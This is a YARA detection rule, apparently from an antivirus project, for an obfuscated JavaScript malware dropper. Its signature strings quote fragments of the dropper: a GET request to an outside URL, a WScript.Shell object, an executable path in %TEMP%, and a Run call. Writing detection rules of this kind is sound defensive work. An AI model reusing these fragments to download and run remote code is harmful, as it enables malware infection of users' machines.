rule sig_20160328_761708582a1b6882e7b6b30ca8550871 {
  meta:
    description = "datamaliciousorder - file 20160328_761708582a1b6882e7b6b30ca8550871.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c1f2cf707aa28d995acd12c1e5d04e35ceb1113e15f3d8003b365165f5557a18"

  strings:
    $s1  = "function Zquxbajvki() {return Qtaoi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"yv2smGA7G.exe\";};" fullword ascii
    $s2  = "do {WScript[Skybvxttnc](Slrse() * 11)} while (Sxqkres[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Qtaoi = function Nphpx() {return WScript[Jkjvu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Sxqkres[Mbzbdnf](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Woosukas(Bfsryyhpyp, Yzvrxf){return Bfsryyhpyp - Yzvrxf;};" fullword ascii
    $s6  = "function Hjbqkd(Vkvbsjofi){Qtaoi[\"Run\"](Vkvbsjofi, Evjgik, Evjgik);};" fullword ascii
    $s7  = "function Njttra() {return ((Irlaalo == true) && (Irlaalo == Gxjgaqs)) ? 1 : Evjgik;};" fullword ascii
    $s8  = "function Qqysjo(){return Ckbnvlesm;};" fullword ascii
    $s9  = "function Tybjqx()" fullword ascii
    $s10 = " while (Htcmirlcte){" fullword ascii
    $s11 = "var Irlaalo = false;" fullword ascii
    $s12 = "function Slrse(){return 22;};" fullword ascii
    $s13 = "Gxjgaqs = true; " fullword ascii
    $s14 = "function Xilur(Rpjjdegaj) {var Vwubx = (1, 2, 3, 4, 5, Rpjjdegaj); return Vwubx;};" fullword ascii
    $s15 = "var Umjehnaci = new this[\"Date\"]();" fullword ascii
    $s16 = "return Woosukas(Cciwm, Pqilr);" fullword ascii
    $s17 = "Irlaalo = true; " fullword ascii
    $s18 = "var Gxjgaqs = false;" fullword ascii
    $s19 = "function Tcbaggalh(){return Jkjvu;};" fullword ascii
    $s20 = "var Hqubpxy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}